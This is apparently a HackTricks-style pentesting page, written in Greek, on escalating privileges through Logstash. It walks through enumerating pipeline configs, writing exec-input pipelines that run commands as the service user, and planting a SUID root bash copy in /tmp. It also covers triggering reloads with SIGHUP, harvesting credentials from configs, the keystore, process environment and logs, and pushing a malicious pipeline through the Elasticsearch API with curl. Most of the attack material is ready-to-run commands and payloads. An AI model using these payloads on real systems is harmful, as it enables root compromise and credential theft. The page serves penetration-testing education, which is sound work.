# Logstash Privilege Escalation

{{#include ../../banners/hacktricks-training.md}}

## Logstash

Το Logstash χρησιμοποιείται για να **συλλέγει, μετασχηματίζει και αποστέλλει logs** μέσω ενός συστήματος γνωστού ως **pipelines**. Αυτά τα pipelines αποτελούνται από στάδια **input**, **filter** και **output**. Ανακύπτει ένα ενδιαφέρον σημείο όταν το Logstash λειτουργεί σε ένα συμβιβασμένο μηχάνημα.

### Pipeline Configuration

Τα pipelines διαμορφώνονται στο αρχείο **/etc/logstash/pipelines.yml**, το οποίο απαριθμεί τις τοποθεσίες των ρυθμίσεων των pipelines:
```yaml
# Define your pipelines here. Multiple pipelines can be defined.
# For details on multiple pipelines, refer to the documentation:
# https://www.elastic.co/guide/en/logstash/current/multiple-pipelines.html

- pipeline.id: main
path.config: "/etc/logstash/conf.d/*.conf"
- pipeline.id: example
path.config: "/usr/share/logstash/pipeline/1*.conf"
pipeline.workers: 6
```
Αυτό το αρχείο αποκαλύπτει πού βρίσκονται τα **.conf** αρχεία που περιέχουν τις ρυθμίσεις των pipeline. Όταν χρησιμοποιείται ένα **Elasticsearch output module**, είναι συνηθισμένο τα **pipelines** να περιέχουν **Elasticsearch credentials**, τα οποία συχνά έχουν εκτεταμένα προνόμια λόγω της ανάγκης του Logstash να γράφει δεδομένα στο Elasticsearch. Οι χαρακτήρες μπαλαντέρ στα μονοπάτια διαμόρφωσης επιτρέπουν στο Logstash να εκτελεί όλα τα αντίστοιχα pipelines στον καθορισμένο κατάλογο.

Εάν το Logstash ξεκινήσει με `-f <directory>` αντί για `pipelines.yml`, **όλα τα αρχεία μέσα σε αυτόν τον κατάλογο συνενώνονται με λεξικογραφική σειρά και αναλύονται ως μία ενιαία διαμόρφωση**. Αυτό δημιουργεί 2 επιθετικές επιπτώσεις:

- Ένα αρχείο που τοποθετείται, όπως `000-input.conf` ή `zzz-output.conf`, μπορεί να αλλάξει τον τρόπο με τον οποίο συναρμολογείται το τελικό pipeline
- Ένα κακοσχηματισμένο αρχείο μπορεί να εμποδίσει τη φόρτωση ολόκληρου του pipeline, οπότε ελέγξτε προσεκτικά τα payloads πριν βασιστείτε στο auto-reload

### Fast Enumeration on a Compromised Host

Σε ένα σύστημα όπου είναι εγκατεστημένο το Logstash, ελέγξτε γρήγορα:
```bash
ps aux | grep -i logstash
systemctl cat logstash 2>/dev/null
cat /etc/logstash/pipelines.yml 2>/dev/null
cat /etc/logstash/logstash.yml 2>/dev/null
find /etc/logstash /usr/share/logstash -maxdepth 3 -type f \( -name '*.conf' -o -name 'logstash.yml' -o -name 'pipelines.yml' \) -ls
rg -n --hidden -S 'password|passwd|api[_-]?key|cloud_auth|ssl_keystore_password|truststore_password|user\s*=>|hosts\s*=>' /etc/logstash /usr/share/logstash 2>/dev/null
```
Επίσης ελέγξτε αν το τοπικό monitoring API είναι προσβάσιμο. Από προεπιλογή δεσμεύεται στη **127.0.0.1:9600**, το οποίο συνήθως αρκεί αφού αποκτήσετε πρόσβαση στο host:
```bash
curl -s http://127.0.0.1:9600/?pretty
curl -s http://127.0.0.1:9600/_node/pipelines?pretty
curl -s http://127.0.0.1:9600/_node/stats/pipelines?pretty
```
Αυτό συνήθως σας δίνει τα pipeline IDs, λεπτομέρειες runtime και επιβεβαίωση ότι το τροποποιημένο pipeline σας έχει φορτωθεί.

Τα credentials που ανακτώνται από το Logstash συχνά ξεκλειδώνουν **Elasticsearch**, οπότε ελέγξτε [this other page about Elasticsearch](../../network-services-pentesting/9200-pentesting-elasticsearch.md).

### Privilege Escalation via Writable Pipelines

To attempt privilege escalation, πρώτα εντοπίστε τον χρήστη υπό τον οποίο τρέχει η υπηρεσία Logstash, συνήθως ο χρήστης **logstash**. Βεβαιωθείτε ότι πληροίτε **ένα** από τα παρακάτω κριτήρια:

- Έχετε **write access** σε ένα αρχείο pipeline **.conf** **ή**
- Το αρχείο **/etc/logstash/pipelines.yml** χρησιμοποιεί wildcard, και μπορείτε να γράψετε στον προορισμό φάκελο

Επιπλέον, **μία** από τις παρακάτω συνθήκες πρέπει να ικανοποιηθεί:

- Δυνατότητα επανεκκίνησης της υπηρεσίας Logstash **ή**
- Το αρχείο **/etc/logstash/logstash.yml** έχει ρυθμισμένο **config.reload.automatic: true**

Εφόσον υπάρχει wildcard στην ρύθμιση, η δημιουργία ενός αρχείου που ταιριάζει σε αυτό το wildcard επιτρέπει την εκτέλεση εντολών. Για παράδειγμα:
```bash
input {
exec {
command => "whoami"
interval => 120
}
}

output {
file {
path => "/tmp/output.log"
codec => rubydebug
}
}
```
Εδώ, **interval** καθορίζει τη συχνότητα εκτέλεσης σε δευτερόλεπτα. Στο παράδειγμα, η εντολή **whoami** εκτελείται κάθε 120 δευτερόλεπτα, με την έξοδό της να κατευθύνεται στο **/tmp/output.log**.

Με **config.reload.automatic: true** στο **/etc/logstash/logstash.yml**, το Logstash θα εντοπίζει και θα εφαρμόζει αυτόματα νέες ή τροποποιημένες ρυθμίσεις pipeline χωρίς ανάγκη επανεκκίνησης. Αν δεν υπάρχει wildcard, μπορούν ακόμη να γίνουν τροποποιήσεις στις υπάρχουσες ρυθμίσεις, αλλά συνιστάται προσοχή για να αποφευχθούν διακοπές.

### Πιο Αξιόπιστα Pipeline Payloads

Το `exec` input plugin εξακολουθεί να λειτουργεί στις τρέχουσες εκδόσεις και απαιτεί είτε `interval` είτε `schedule`. Εκτελείται με **forking** το Logstash JVM, οπότε αν η μνήμη είναι περιορισμένη το payload σας μπορεί να αποτύχει με `ENOMEM` αντί να τρέξει σιωπηλά.

Ένα πιο πρακτικό privilege-escalation payload είναι συνήθως αυτό που αφήνει ένα μόνιμο artifact:
```bash
input {
exec {
command => "cp /bin/bash /tmp/logroot && chown root:root /tmp/logroot && chmod 4755 /tmp/logroot"
interval => 300
}
}
output {
null {}
}
```
Εάν δεν έχετε δικαιώματα επανεκκίνησης αλλά μπορείτε να στείλετε σήμα στη διεργασία, το Logstash υποστηρίζει επίσης επαναφόρτωση ενεργοποιούμενη από **SIGHUP** σε συστήματα τύπου Unix:
```bash
kill -SIGHUP $(pgrep -f logstash)
```
Να γνωρίζετε ότι δεν είναι κάθε plugin συμβατό με επαναφόρτωση. Για παράδειγμα, η είσοδος **stdin** αποτρέπει την αυτόματη επαναφόρτωση, οπότε μην υποθέτετε ότι `config.reload.automatic` θα εντοπίσει πάντα τις αλλαγές σας.

### Κλοπή μυστικών από το Logstash

Πριν επικεντρωθείτε μόνο στην εκτέλεση κώδικα, συλλέξτε τα δεδομένα στα οποία έχει ήδη πρόσβαση το Logstash:

- Τα διαπιστευτήρια σε απλό κείμενο συχνά είναι hardcoded μέσα σε `elasticsearch {}` outputs, `http_poller`, JDBC inputs, ή σε ρυθμίσεις σχετικές με το cloud
- Οι ασφαλείς ρυθμίσεις μπορεί να βρίσκονται στο **`/etc/logstash/logstash.keystore`** ή σε άλλο κατάλογο `path.settings`
- Ο κωδικός του keystore συχνά παρέχεται μέσω **`LOGSTASH_KEYSTORE_PASS`**, και οι εγκαταστάσεις που γίνονται μέσω πακέτου συνήθως τον παίρνουν από **`/etc/sysconfig/logstash`**
- Η επέκταση μεταβλητών περιβάλλοντος με `${VAR}` επιλύεται κατά την εκκίνηση του Logstash, οπότε αξίζει να ελέγξετε το περιβάλλον της υπηρεσίας

Χρήσιμοι έλεγχοι:
```bash
ls -l /etc/logstash /etc/logstash/logstash.keystore 2>/dev/null
strings /etc/logstash/conf.d/*.conf 2>/dev/null | head
tr '\0' '\n' < /proc/$(pgrep -o -f logstash)/environ 2>/dev/null | sort
cat /etc/sysconfig/logstash 2>/dev/null
journalctl -u logstash --no-pager 2>/dev/null | tail -n 200
ls -lah /var/log/logstash 2>/dev/null
```
Αυτό αξίζει επίσης έλεγχο επειδή το **CVE-2023-46672** έδειξε ότι το Logstash μπορούσε να καταγράψει ευαίσθητες πληροφορίες σε logs υπό συγκεκριμένες συνθήκες. Σε έναν post-exploitation host, παλιά Logstash logs και `journald` entries μπορούν επομένως να αποκαλύψουν credentials ακόμα κι αν η τρέχουσα config αναφέρεται στο keystore αντί να αποθηκεύει secrets inline.

### Κακοποίηση κεντρικής διαχείρισης pipelines

Σε ορισμένα περιβάλλοντα, ο host δεν εξαρτάται καθόλου από τοπικά αρχεία `.conf`. Εάν έχει ρυθμιστεί **`xpack.management.enabled: true`**, το Logstash μπορεί να τραβήξει κεντρικά διαχειριζόμενα pipelines από Elasticsearch/Kibana, και μετά την ενεργοποίηση αυτής της λειτουργίας τα τοπικά pipeline configs δεν είναι πια η πηγή της αλήθειας.

Αυτό σημαίνει διαφορετικό μονοπάτι επίθεσης:

1. Ανάκτηση Elastic credentials από τοπικές Logstash ρυθμίσεις, το keystore, ή logs
2. Επαλήθευση αν ο λογαριασμός έχει το cluster privilege **`manage_logstash_pipelines`**
3. Δημιουργία ή αντικατάσταση ενός centrally managed pipeline ώστε ο Logstash host να εκτελέσει το payload σας στο επόμενο poll interval

Το Elasticsearch API που χρησιμοποιείται για αυτή τη λειτουργία είναι:
```bash
curl -X PUT http://ELASTIC:9200/_logstash/pipeline/pwned \
-H 'Content-Type: application/json' \
-u user:password \
-d '{
"description": "malicious pipeline",
"pipeline": "input { exec { command => \"id > /tmp/.ls-rce\" interval => 120 } } output { null {} }",
"pipeline_metadata": {"type": "logstash_pipeline", "version": "1"},
"pipeline_settings": {"pipeline.workers": 1, "pipeline.batch.size": 1}
}'
```
Αυτό είναι ιδιαίτερα χρήσιμο όταν τα τοπικά αρχεία είναι μόνο για ανάγνωση αλλά το Logstash έχει ήδη εγγραφεί για να ανακτά pipelines απομακρυσμένα.

## Αναφορές

- [Elastic Docs: Reloading the Config File](https://www.elastic.co/guide/en/logstash/8.19/reloading-config.html)
- [Elastic Docs: Configure Centralized Pipeline Management](https://www.elastic.co/guide/en/logstash/8.19/configuring-centralized-pipelines.html)

{{#include ../../banners/hacktricks-training.md}}
